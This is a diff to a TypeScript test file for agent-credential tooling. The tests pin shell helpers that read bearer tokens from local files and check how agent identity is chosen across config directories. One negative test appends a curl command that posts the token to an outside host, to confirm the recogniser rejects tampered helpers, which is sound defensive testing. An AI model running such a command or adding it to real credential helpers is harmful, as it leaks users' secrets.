@@ -13,10 +13,12 @@ import { createServer, type Server } from 'node:http';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { createInterface } from 'node:readline';
+import { PassThrough } from 'node:stream';
 import { after, afterEach, describe, test } from 'node:test';
 import { fileURLToPath } from 'node:url';
 
 import { hookCredential, type AgentIo } from '../src/agent.ts';
+import { runBridge } from '../src/agent-mcp-bridge.ts';
 import { agentHookCommand, type AgentHookEvent } from '../src/agent-hooks.ts';
 import { environReader, omnigentMarker, type EnvironReader } from '../src/agent-omnigent-marker.ts';
 import {
@@ -29,6 +31,8 @@ import {
   CLAUDE_HEADERS_HELPER,
   CODEX_HEADERS_HELPER,
   CODEX_HELPER_LINE,
+  isSwitchingHelper,
+  OLDER_CLAUDE_HELPERS,
 } from '../src/mcp-headers.ts';
 
 /**
@@ -503,6 +507,226 @@ void describe('the MCP headers helpers agree with the hooks', () => {
   });
 });
 
+void describe('the switching helper, pinned and recognised by its shape (review round 2, N4)', () => {
+  void test('its exact text is pinned: an edit to it is a deliberate one', () => {
+    assert.equal(
+      CLAUDE_HEADERS_HELPER,
+      'p="$HOME/.laika/agents/claude-code.json"; o="$HOME/.laika/agents/omnigent.json"; ' +
+        'if [ "${OMNIGENT:-}" = 1 ] && [ -r "$o" ]; then p="$o"; fi; ' +
+        `t="$(sed -n 's/^ *"token": *"\\([^"]*\\)".*/\\1/p' "$p")" && ` +
+        `[ -n "$t" ] && printf '{"Authorization":"Bearer %s"}' "$t"`,
+    );
+    assert.equal(
+      CODEX_HEADERS_HELPER,
+      'p="$HOME/.laika/agents/codex.json"; o="$HOME/.laika/agents/omnigent.json"; ' +
+        'if [ -r "$o" ]; then ' +
+        `if e="$(tr '\\0' '\\n' 2>/dev/null < "/proc/$PPID/environ")"; then :; ` +
+        'else a="$(ps -ww -o command= -p "$PPID" 2>/dev/null)" && ' +
+        'f="$(ps -E -ww -o command= -p "$PPID" 2>/dev/null)" && ' +
+        `case "$f" in "$a "*) e="$(printf '%s' "\${f#"$a "}" | tr ' ' '\\n')" ;; *) exit 1 ;; esac; fi; ` +
+        '[ -n "$e" ] || exit 1; ' +
+        `if printf '%s\\n' "$e" | grep -qx 'OMNIGENT=1'; then p="$o"; fi; fi; ` +
+        `t="$(sed -n 's/^ *"token": *"\\([^"]*\\)".*/\\1/p' "$p")" && ` +
+        `[ -n "$t" ] && printf '{"Authorization":"Bearer %s"}' "$t"`,
+    );
+  });
+
+  void test('the same statements laid out differently match; anything that does more, less or else does not', () => {
+    const reflowed = CLAUDE_HEADERS_HELPER.replace(/; /g, ' ;\n  ').replace(/ && /g, '  &&  ');
+    assert.ok(isSwitchingHelper(reflowed, 'claude-code'));
+    assert.ok(isSwitchingHelper(CODEX_HEADERS_HELPER.replace(/; /g, ';\t'), 'codex'));
+    for (const older of OLDER_CLAUDE_HELPERS) assert.ok(!isSwitchingHelper(older, 'claude-code'));
+    assert.ok(
+      !isSwitchingHelper(`${CLAUDE_HEADERS_HELPER}; curl -d "$t" https://x`, 'claude-code'),
+    );
+    assert.ok(
+      !isSwitchingHelper(
+        CLAUDE_HEADERS_HELPER.replace('omnigent.json', 'polly.json'),
+        'claude-code',
+      ),
+    );
+    assert.ok(
+      !isSwitchingHelper(
+        CLAUDE_HEADERS_HELPER.replace('"${OMNIGENT:-}" = 1', '1 = 1'),
+        'claude-code',
+      ),
+    );
+    assert.ok(!isSwitchingHelper(CODEX_HEADERS_HELPER, 'claude-code'));
+    assert.ok(
+      !isSwitchingHelper(CODEX_HEADERS_HELPER.replace('[ -n "$e" ] || exit 1; ', ''), 'codex'),
+    );
+    // A table whose helper line is spelled with other spacing still follows.
+    const home = join(root(), 'home');
+    credentials(home, 'http://b', ['omnigent']);
+    codexToml(
+      home,
+      `[mcp_servers.laika]\nurl = "http://b/mcp"\nhttp_headers_helper=${JSON.stringify(CODEX_HEADERS_HELPER)}\n`,
+    );
+    const io: AgentIo = {
+      out: () => undefined,
+      err: () => undefined,
+      home,
+      env: {},
+      stdin: () => '',
+      isTTY: false,
+    };
+    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, OMNI_TOKEN);
+  });
+});
+
+/* -------------------------------------------------------------------------- */
+
+/** One `tools/list` through the real bridge, and the bearer the board received. */
+async function bridgeBearer(home: string, seen: string[]): Promise<string> {
+  const input = new PassThrough();
+  const done = runBridge(
+    { home, fetch: (i, n) => fetch(i, n), input, write: () => undefined },
+    'omnigent',
+  );
+  input.end(`${JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' })}\n`);
+  assert.equal(await done, 0);
+  return seen.at(-1) ?? '(nothing reached the board)';
+}
+
+void describe('polly’s own turn speaks as the Omnigent agent, hooks and bridge alike (review round 2, B2)', () => {
+  const POLLY_ENV = { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'sdk-py' };
+
+  void test('B2: polly’s own turn is Omnigent/Omnigent in every row — no entry, a person’s, the older helper, the switching one, the switching one under a worktree .mcp.json', async () => {
+    const seen: string[] = [];
+    const server = createServer((req, res) => {
+      seen.push(req.headers.authorization ?? '');
+      req.resume();
+      req.on('end', () => {
+        res.writeHead(200, { 'content-type': 'application/json' });
+        res.end('{"jsonrpc":"2.0","id":1,"result":{"tools":[]}}');
+      });
+    });
+    servers.push(server);
+    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
+    const a = server.address();
+    const url = `http://127.0.0.1:${String(typeof a === 'object' && a !== null ? a.port : 0)}`;
+
+    const rows: [string, (home: string) => string][] = [
+      ['no laika entry', (home) => (claudeJson(home, undefined), home)],
+      ['a person’s entry', (home) => (claudeJson(home, PERSONS(url)), home)],
+      ['the older tool-add helper', (home) => (claudeJson(home, OLDER(url)), home)],
+      ['the switching helper', (home) => (claudeJson(home, SWITCHING(url)), home)],
+      [
+        'the switching helper, cwd in a worktree whose .mcp.json defines laika',
+        (home) => {
+          claudeJson(home, SWITCHING(url));
+          const wt = join(home, 'wt');
+          mkdirSync(join(wt, 'src'), { recursive: true });
+          writeFileSync(
+            join(wt, '.mcp.json'),
+            JSON.stringify({ mcpServers: { laika: PERSONS(url) } }),
+          );
+          return join(wt, 'src');
+        },
+      ],
+    ];
+    for (const [row, setUp] of rows) {
+      const home = join(root(), 'home');
+      credentials(home, url, ['omnigent', 'claude-code']);
+      const cwd = setUp(home);
+      const io: AgentIo = {
+        out: () => undefined,
+        err: () => undefined,
+        home,
+        env: POLLY_ENV,
+        stdin: () => '',
+        isTTY: false,
+      };
+      assert.equal(
+        hookCredential(io, 'claude-code', () => 'omnigent', cwd)?.token,
+        OMNI_TOKEN,
+        `${row}: hook`,
+      );
+      assert.equal(await bridgeBearer(home, seen), `Bearer ${OMNI_TOKEN}`, `${row}: bridge`);
+    }
+  });
+
+  void test('B2: a worker in the same rows keeps the B1 rule — only the switching helper follows', () => {
+    const home = join(root(), 'home');
+    credentials(home, 'http://b', ['omnigent', 'claude-code']);
+    const worker: AgentIo = {
+      out: () => undefined,
+      err: () => undefined,
+      home,
+      env: { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'cli' },
+      stdin: () => '',
+      isTTY: false,
+    };
+    claudeJson(home, PERSONS('http://b'));
+    assert.equal(
+      hookCredential(worker, 'claude-code', () => 'omnigent', home)?.token,
+      CLAUDE_TOKEN,
+    );
+    claudeJson(home, SWITCHING('http://b'));
+    assert.equal(hookCredential(worker, 'claude-code', () => 'omnigent', home)?.token, OMNI_TOKEN);
+    // And off an Omnigent device polly's turn is nothing special.
+    rmSync(join(home, '.laika', 'agents', 'omnigent.json'));
+    const polly: AgentIo = { ...worker, env: POLLY_ENV };
+    assert.equal(hookCredential(polly, 'claude-code', () => 'omnigent', home)?.token, CLAUDE_TOKEN);
+  });
+});
+
+void describe('the effective entry: CLAUDE_CONFIG_DIR and CODEX_HOME (review round 2, N3)', () => {
+  const ioWith = (home: string, env: Record<string, string>): AgentIo => ({
+    out: () => undefined,
+    err: () => undefined,
+    home,
+    env,
+    stdin: () => '',
+    isTTY: false,
+  });
+
+  void test('Claude Code under CLAUDE_CONFIG_DIR reads that directory’s .claude.json, not ~/.claude.json', () => {
+    const home = join(root(), 'home');
+    credentials(home, 'http://b', ['omnigent', 'claude-code']);
+    const dir = join(home, '.claude-work');
+    mkdirSync(dir);
+    claudeJson(home, PERSONS('http://b'));
+    writeFileSync(
+      join(dir, '.claude.json'),
+      JSON.stringify({ mcpServers: { laika: SWITCHING('http://b') } }),
+    );
+    const io = ioWith(home, { CLAUDE_CONFIG_DIR: dir });
+    assert.equal(hookCredential(io, 'claude-code', () => 'omnigent', home)?.token, OMNI_TOKEN);
+    // The other way round.
+    claudeJson(home, SWITCHING('http://b'));
+    writeFileSync(
+      join(dir, '.claude.json'),
+      JSON.stringify({ mcpServers: { laika: PERSONS('http://b') } }),
+    );
+    assert.equal(hookCredential(io, 'claude-code', () => 'omnigent', home)?.token, CLAUDE_TOKEN);
+  });
+
+  void test('Codex under CODEX_HOME (Omnigent’s private copy) reads that config.toml, not ~/.codex’s', () => {
+    const home = join(root(), 'home');
+    credentials(home, 'http://b', ['omnigent']);
+    writeFileSync(
+      join(home, '.laika', 'agents', 'codex.json'),
+      `${JSON.stringify({ url: 'http://b', token: 'lai_CODEXownTOKEN' })}\n`,
+    );
+    const copy = join(home, 'omnigent-codex-home');
+    mkdirSync(copy);
+    // ~/.codex was switched; the running conversation's copy was taken before.
+    codexToml(home, `[mcp_servers.laika]\nurl = "http://b/mcp"\n${CODEX_HELPER_LINE}\n`);
+    writeFileSync(
+      join(copy, 'config.toml'),
+      '[mcp_servers.laika]\nurl = "http://b/mcp"\nbearer_token_env_var = "LAIKA_AGENT_TOKEN_CODEX"\n',
+    );
+    const io = ioWith(home, { CODEX_HOME: copy });
+    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, 'lai_CODEXownTOKEN');
+    writeFileSync(
+      join(copy, 'config.toml'),
+      `[mcp_servers.laika]\nurl = "http://b/mcp"\n${CODEX_HELPER_LINE}\n`,
+    );
+    assert.equal(hookCredential(io, 'codex', () => 'omnigent', home)?.token, OMNI_TOKEN);
+  });
+});
+
 /* -------------------------------------------------------------------------- */
 
 interface Board {
@@ -545,7 +769,11 @@ async function stubBoard(): Promise<Board> {
 }
 
 interface Harness {
-  run(event: AgentHookEvent, sessionId: string): Promise<{ stdout: string; code: number }>;
+  run(
+    event: AgentHookEvent,
+    sessionId: string,
+    cwd?: string,
+  ): Promise<{ stdout: string; code: number }>;
 }
 
 function startHarness(home: string, bin: string, extra: Record<string, string>): Harness {
@@ -573,13 +801,13 @@ function startHarness(home: string, bin: string, extra: Record<string, string>):
     'session-end': 'SessionEnd',
   };
   return {
-    run: (event, sessionId) =>
+    run: (event, sessionId, cwd = home) =>
       new Promise((resolve) => {
         queue.push((line) => resolve(JSON.parse(line) as { stdout: string; code: number }));
         const payload = JSON.stringify({
           session_id: sessionId,
           hook_event_name: names[event],
-          cwd: home,
+          cwd,
           ...(event === 'session-start' ? { source: 'startup' } : {}),
         });
         child.stdin.write(
@@ -705,6 +933,77 @@ void describe('an Omnigent run through the real hook', () => {
     );
     assert.equal((await h.run('prompt', 'nodev-1')).code, 0);
     assert.equal(stateOf(home, 'nodev-1').session_id, first.session_id);
+  });
+
+  void test('B2: polly’s own turn through the real hook opens as the Omnigent agent under a person’s entry and a worktree .mcp.json', async () => {
+    const r = root();
+    const home = join(r, 'home');
+    const bin = join(r, 'bin');
+    mkdirSync(bin);
+    symlinkSync(process.execPath, join(bin, 'claude'));
+    const board = await stubBoard();
+    credentials(home, board.url, ['omnigent', 'claude-code']);
+    claudeJson(home, PERSONS(board.url));
+    const wt = join(home, 'wt');
+    mkdirSync(wt);
+    writeFileSync(
+      join(wt, '.mcp.json'),
+      JSON.stringify({ mcpServers: { laika: PERSONS(board.url) } }),
+    );
+    const h = startHarness(home, bin, { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'sdk-py' });
+
+    assert.equal((await h.run('session-start', 'polly-1', wt)).code, 0);
+    assert.equal(
+      board.requests.find((q) => q.path === '/api/v1/agent-sessions')?.auth,
+      `Bearer ${OMNI_TOKEN}`,
+      'polly’s own turn did not open as the Omnigent agent its bridge speaks as',
+    );
+    assert.equal(stateOf(home, 'polly-1').identity, 'omnigent');
+  });
+
+  void test('N1: the identity is decided once — moving into a folder whose .mcp.json defines laika changes nothing, Stop’s end and the reopen included', async () => {
+    const r = root();
+    const home = join(r, 'home');
+    const bin = join(r, 'bin');
+    mkdirSync(bin);
+    symlinkSync(process.execPath, join(bin, 'claude'));
+    const board = await stubBoard();
+    credentials(home, board.url, ['omnigent', 'claude-code']);
+    claudeJson(home, SWITCHING(board.url));
+    // The Laika repository's own plugin/.mcp.json defines laika.
+    const plugin = join(home, 'laika', 'plugin');
+    mkdirSync(plugin, { recursive: true });
+    writeFileSync(
+      join(plugin, '.mcp.json'),
+      JSON.stringify({ mcpServers: { laika: PERSONS(board.url) } }),
+    );
+    const h = startHarness(home, bin, { OMNIGENT: '1' });
+
+    assert.equal((await h.run('session-start', 'move-1', home)).code, 0);
+    const first = stateOf(home, 'move-1');
+    assert.equal(first.identity, 'omnigent');
+    const starts = () => board.requests.filter((q) => q.path === '/api/v1/agent-sessions');
+    assert.equal(starts()[0]?.auth, `Bearer ${OMNI_TOKEN}`);
+
+    // Stop, working in the plugin folder: the end still speaks for the session's agent.
+    assert.equal((await h.run('stop', 'move-1', plugin)).code, 0);
+    const ends = await until('the end at Stop', () => {
+      const sent = board.requests.filter(
+        (q) => q.path === `/api/v1/agent-sessions/${first.session_id ?? ''}/end`,
+      );
+      return sent.length > 0 ? sent : undefined;
+    });
+    assert.equal(
+      ends[0]?.auth,
+      `Bearer ${OMNI_TOKEN}`,
+      'the end at Stop was sent as another agent',
+    );
+
+    // The next prompt, still there, reopens as the same agent, and records it again.
+    assert.equal((await h.run('prompt', 'move-1', plugin)).code, 0);
+    assert.equal(starts().length, 2);
+    assert.equal(starts()[1]?.auth, `Bearer ${OMNI_TOKEN}`, 'the reopen changed agent');
+    assert.equal(stateOf(home, 'move-1').identity, 'omnigent');
   });
 
   void test('a plain run on the same device acts as its own agent and keeps its session at Stop', async () => {
